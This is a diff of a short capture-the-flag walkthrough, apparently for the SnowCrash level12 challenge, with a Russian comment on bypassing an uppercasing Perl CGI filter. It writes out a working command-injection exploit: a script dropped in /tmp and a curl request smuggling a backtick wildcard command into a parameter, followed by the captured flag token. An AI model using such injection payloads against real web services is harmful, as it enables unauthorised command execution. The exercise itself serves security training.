@@ -42,14 +42,14 @@ sub n {
 n(t(param("x"), param("y")));
 
 
-вызывается egrep оторый использует регулярное вырожение, создаем файл с именем в верхнем регистре чтобы заменить ею регулярку
+вызывается egrep оторый использует регулярное вырожение, создаем файл с именем в верхнем регистре чтобы заменить ею регуляркой
 
 
-echo "getflag>/tmp/getflag">/tmp/TMP
+echo "getflag>/tmp/getflag13">/tmp/TMP
 chmod +x /tmp/TMP
 curl 127.0.0.1:4646?x='`/*/TMP`'
 
-level12@SnowCrash:~$ cat /tmp/getflag
+level12@SnowCrash:~$ cat /tmp/getflag13
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 
 su level13
